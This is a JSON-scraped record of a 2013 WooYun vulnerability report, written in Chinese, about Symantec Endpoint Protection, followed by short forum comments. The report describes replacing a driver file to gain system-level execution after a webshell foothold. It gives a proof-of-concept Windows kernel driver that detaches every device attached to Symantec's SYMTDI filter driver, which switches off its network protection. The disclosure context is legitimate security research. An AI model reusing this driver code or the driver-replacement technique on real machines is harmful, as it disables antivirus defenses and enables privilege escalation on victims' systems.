{"id": 7750, "wybug_id": "wooyun-2013-036254", "wybug_title": "借赛门铁透过攻破防病毒软件谈服务器提权（POC）", "wybug_corp": "赛门铁克", "wybug_author": "n0bele", "wybug_date": "2013-09-06 11:24", "wybug_open_date": "2013-12-05 11:25", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 有些厂商老觉得很多问题没必要修复，对此我只想套用一句老话，能力决定了你的眼界.自己不会利用，不代表着别人不会.所以安全厂商招人的时候别老招那种用汇编写管理系统的程序员，因为他们的思维就定格在那一亩三分地上. 详细说明：  借赛门铁克吐个槽，当然了国外大多数防病毒厂商都是不防驱动加载的.我不懂他们的设计思路，但事实是再优秀的防病毒引擎你也得先跑得起来不是？驱动是什么权限?system权限怎么让驱动运行?有的时候拿到了webshell没有执行程序、写注册表的权限,有的只是浏览、修改特定几个目录的权限。利用我前几天提到的方法，替换掉比如：C:\\Program Files\\目录下任意驱动，达到重启后自动执行驱动提权，具体payload代码网上有，自己找.为什么不用lpk.dll等劫持提权？因为杀毒软件会报的：）恩，回到赛门铁克的问题，看POC吧\nvoid FuckFilters(WCHAR * Name){\tUNICODE_STRING TName;\tPDRIVER_OBJECT TDrvObj;\tPDEVICE_OBJECT CurrentDevice;\tNTSTATUS status;\tRtlInitUnicodeString ( &TName, Name);\tstatus = ObReferenceObjectByName( &TName,\t\tOBJ_CASE_INSENSITIVE,\t\tNULL,\t\t0,\t\t*IoDriverObjectType,\t\tKernelMode,    \t\tNULL,\t\t(PVOID*)&TDrvObj);\tif(NT_SUCCESS(status))\t{\t\tif(TDrvObj)\t\t{\t\t\tCurrentDevice = TDrvObj->DeviceObject;\t\t\twhile(CurrentDevice != NULL )\t\t\t{\t\t\t\tCurrentDevice->AttachedDevice = 0;\t\t\t\tCurrentDevice = CurrentDevice->NextDevice; \t\t\t}\t\t\tObDereferenceObject(TDrvObj);\t\t}\t}}NTSTATUS DriverEntry(    IN OUT PDRIVER_OBJECT   DriverObject,    IN PUNICODE_STRING      RegistryPath    ){  FuckFilters(L\"\\\\Driver\\\\SYMTDI\");}\n   漏洞证明：  这个是赛门铁克防病毒企业版更新到最新的版本本来TDI好好的\n\n执行代码后就啥也没了.   修复方案：  他们懂但不想修复，我也没办法   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-09-06 13:06 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  简要描述 很有意思    \n     2013-09-06 14:12 |    \t\tFakehac \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | 菜鸟刚来，努力挖洞洞。。。)\t\t \n  貌似厄只会懂点汇编。顺便说一下，招汇编的顶多就是去处理病毒，鉴黑白的流水线工程师而已。写杀毒引擎，杀毒软件的，都是高级语言，牛逼的那种，所以不能以偏概全。    \n     2013-09-06 14:25 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  嘿嘿    \n     2013-09-06 18:11 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  杀毒软件能正确查杀多少毒才是主要问题，所以一般招会汇编会逆向工程的多，杀毒软件本身并没有什么好写的。    \n     2013-09-07 22:08 |    \t\t小九 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 非尖刀小九,民间草根)\t\t \n  关注    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}